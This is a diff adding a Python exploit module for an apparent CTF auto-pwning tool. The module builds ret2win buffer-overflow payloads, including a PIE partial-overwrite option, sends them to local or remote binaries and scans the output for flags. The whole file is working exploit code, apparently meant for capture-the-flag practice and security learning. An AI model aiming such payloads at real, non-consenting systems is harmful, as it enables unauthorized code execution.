@@ -1,0 +1,100 @@
+"""
+Penterous — ret2win strategy: jump to hidden win/flag function.
+"""
+import time
+from typing import Optional
+from strategies.base import ExploitStrategy, ExploitResult
+from utils.logger import info, success, warning, error
+from utils.pwntools_wrap import PWNTOOLS_AVAILABLE
+
+
+class Ret2WinStrategy(ExploitStrategy):
+    """
+    Simplest exploit: binary has a win()/flag() function, PIE is off.
+
+    Local  -> pwntools process (PTY, line-buffered) so the flag is captured
+              even when the process crashes immediately after printing it.
+    Remote -> pwntools remote tube
+    """
+
+    def execute(self, mode: str = 'local', host: str = None, port: int = None) -> ExploitResult:
+        start = time.time()
+        strategy = 'ret2win'
+
+        if not self.binary.win_functions:
+            return self._make_result(False, None, strategy, b'', b'', start,
+                                     "No win function found", mode=mode)
+
+        name, win_addr = self.binary.win_functions[0]
+        info(f"Win function: {name}() at 0x{win_addr:x}")
+
+        win_args = self.binary.win_args.get(name, [])
+        if win_args:
+            args_display = ", ".join(f"0x{a:x}" for a in win_args)
+            info(f"Detected win() arguments: {args_display}")
+
+        pie = self.binary.protections.get('PIE', False)
+        if pie:
+            warning("PIE enabled — attempting partial overwrite (last 2 bytes)")
+            payload = b'A' * self.offset + (win_addr & 0xFFFF).to_bytes(2, 'little')
+        else:
+            payload = self.rop.build_ret2win(self.offset, win_addr, win_args=win_args)
+
+        bits = self.binary.bits
+        p_func = f"p{'64' if bits == 64 else '32'}"
+
+        # FIX: show ret gadget in log so it's clear it's being used
+        ret_gadget_addr = self.rop._find_ret_gadget() if (bits == 64 and not pie) else 0
+        if win_args:
+            args_chain = " + DEAD + " + " + ".join(f"{p_func}(0x{a:x})" for a in win_args)
+        else:
+            args_chain = ""
+
+        if ret_gadget_addr:
+            info(f"Payload: {b'A' * min(self.offset, 12)}... + {p_func}(0x{ret_gadget_addr:x}) [ret] + {p_func}(0x{win_addr:x}){args_chain}")
+        else:
+            info(f"Payload: {b'A' * min(self.offset, 12)}... + {p_func}(0x{win_addr:x}){args_chain}")
+        info(f"Payload size: {len(payload)} bytes")
+
+        if mode == 'local':
+            output = self._exec_local(payload)
+        else:
+            if not PWNTOOLS_AVAILABLE:
+                return self._make_result(False, None, strategy, payload, b'', start,
+                                         "pwntools required for remote mode", mode=mode)
+            tube = self._get_tube(host, port)
+            if tube is None:
+                return self._make_result(False, None, strategy, payload, b'', start,
+                                         "Failed to connect to remote", mode=mode)
+            output = self._send_and_receive_remote(tube, payload)
+
+        # Strip lines that are purely padding A's (echoed input)
+        clean_lines = []
+        for line in output.splitlines(keepends=True):
+            stripped = line.strip(b'\x00\n\r ')
+            if stripped and all(b == ord('A') for b in stripped):
+                continue
+            clean_lines.append(line)
+        clean_output = b''.join(clean_lines)
+
+        flag = self.hunter.hunt(clean_output)
+        if not flag:
+            flag = self.hunter.hunt(output)
+
+        if not flag and output:
+            decoded = output.decode('utf-8', errors='replace').strip()
+            if decoded:
+                info(f"Raw output: {decoded[:300]}")
+
+        return self._make_result(
+            success_=flag is not None,
+            flag=flag,
+            strategy=strategy,
+            payload=payload,
+            output=output,
+            start_time=start,
+            mode=mode,
+            host=host or '',
+            port=port or 0,
+            error_msg="" if flag else "Flag pattern not found in output (win() may need flag.txt to exist)",
+        )
